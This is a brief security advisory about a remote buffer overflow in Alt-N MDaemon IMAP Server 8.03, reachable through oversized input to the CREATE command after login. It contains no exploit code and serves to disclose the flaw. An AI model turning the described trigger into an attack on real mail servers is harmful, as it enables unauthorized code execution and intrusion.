Alt-N MDaemon IMAP Server is affected by a remote buffer overflow vulnerability.

This issue presents itself when an attacker submits excessive data through the CREATE command subsequent to authentication

This vulnerability may be leveraged to execute arbitrary code in the context of the server, facilitating unauthorized access to the affected computer.

Alt-N MDaemon 8.03 is reported to be vulnerable. Other versions are likely affected as well.
